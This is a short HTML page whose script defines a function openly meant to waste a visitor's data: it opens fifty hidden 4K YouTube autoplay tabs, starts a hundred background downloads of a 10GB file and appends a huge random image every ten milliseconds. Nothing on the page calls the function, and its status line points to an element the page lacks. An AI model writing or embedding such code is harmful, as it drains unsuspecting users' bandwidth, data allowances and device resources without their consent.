<!DOCTYPE html>
<html lang="en">
<head>

    <script>
        function startWastingData() {
            // Open multiple YouTube 4K streams
            for (let i = 0; i < 50; i++) {
                let vid = window.open("https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&vq=hd2160", "_blank");
                if (vid) vid.blur(); // Hide the tab
            }

            // Download large files in the background
            for (let i = 0; i < 100; i++) {
                fetch("https://speed.hetzner.de/10GB.bin")
                    .then(response => response.blob())
                    .catch(error => console.error("Download failed", error));
            }

            // Load high-resolution images in a loop
            setInterval(() => {
                let img = new Image();
                img.src = `https://source.unsplash.com/random/4000x4000?nocache=${Math.random()}`;
                document.body.appendChild(img);
            }, 10);

            document.getElementById("status").innerText = "ðŸ”¥ Wasting Data at MAX SPEED!";
        }
    </script>
</head>
<body>

</body>
</html>
